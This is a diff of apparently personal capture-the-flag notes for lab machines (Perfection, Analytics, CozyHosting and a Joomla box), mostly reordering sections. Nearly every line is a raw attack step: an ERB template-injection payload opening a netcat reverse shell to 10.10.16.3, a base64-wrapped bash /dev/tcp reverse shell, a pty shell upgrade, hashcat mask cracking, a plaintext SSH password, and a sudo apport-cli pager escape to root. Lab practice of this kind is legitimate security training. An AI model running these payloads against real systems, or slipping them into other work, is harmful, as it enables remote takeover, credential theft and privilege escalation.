@@ -1,16 +1,5 @@
 容易忘
 
-Perfection
-test
-<%= system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.3 1234 >/tmp/f') %>
-test
-https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-~/Migration/pupilpath_credentials.db
-/var/spool/mail/susan
-hashcat -m 1400 -a 3 hash.txt susan_nasus_?d?d?d?d?d?d?d?d?d
-sudo cat /root/root.txt
-
 Analytics
 data.analytical.htb
 https://github.com/m3m0o/metabase-pre-auth-rce-poc
@@ -51,6 +40,7 @@ show databases;
 use joomla;
 show tables;
 select * from sd4fg_users;
+john
 ssh logan@10.10.11.242
 password: tequieromucho
 priv:
@@ -59,6 +49,17 @@ sudo /usr/bin/apport-cli --file-bug
 2
 V
 !/bin/bash
+
+Perfection
+test
+<%= system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.3 1234 >/tmp/f') %>
+test
+https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+~/Migration/pupilpath_credentials.db
+/var/spool/mail/susan
+hashcat -m 1400 -a 3 hash.txt susan_nasus_?d?d?d?d?d?d?d?d?d
+sudo cat /root/root.txt
 
 CozyHosting
 echo "bash -i >& /dev/tcp/10.10.16.3/1236 0>&1" | base64 -w 0
